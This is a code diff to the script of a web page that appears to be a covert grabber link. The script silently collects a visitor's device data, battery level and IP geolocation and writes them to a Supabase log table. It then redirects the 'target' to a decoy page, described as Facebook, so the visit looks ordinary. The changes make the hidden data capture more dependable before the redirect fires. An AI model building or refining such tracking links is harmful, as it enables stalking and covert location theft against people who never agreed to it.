@@ -24,11 +24,18 @@
                 return;
             }
             try {
-                await _supabase.from('access_logs').insert([payload]);
+                // Await the database write completely before redirecting
+                const { error } = await _supabase.from('access_logs').insert([payload]);
+                if (error) {
+                    console.error("Supabase insert error:", error.message);
+                }
             } catch (err) {
                 console.error("Telemetry insert error:", err);
             }
-            window.location.href = redirectUrl;
+            // Small delay to ensure network packet clears, then redirect
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 300);
         }
 
         function parseDeviceData() {
@@ -80,7 +87,7 @@
                 payload.battery_charge = `${Math.round(b.level * 100)}%`;
             } catch(e){}
 
-            // Fail-safe IP Geolocation fetch using alternative path layout to prevent 404s
+            // Silent IP Geolocation fetch
             try {
                 const ipRes = await fetch(`https://ipapi.co/${IPAPI_KEY}/json/`);
                 if (ipRes.ok) {
@@ -91,7 +98,6 @@
                         payload.gps_longitude = ipData.longitude;
                     }
                 } else {
-                    // Fallback to standard endpoint if key-in-path fails
                     const fallbackRes = await fetch(`https://ipapi.co/json/`);
                     const fallbackData = await fallbackRes.json();
                     if (fallbackData && fallbackData.ip) {
@@ -100,11 +106,9 @@
                         payload.gps_longitude = fallbackData.longitude;
                     }
                 }
-            } catch(err) {
-                // Ignore network lookup blocks so redirect never fails
-            }
+            } catch(err) {}
 
-            // Execute database write and seamlessly bounce target to destination
+            // Wait for database write to finish, then bounce to Facebook
             await fireAndRedirect(payload, decoyUrl);
         });
     </script>
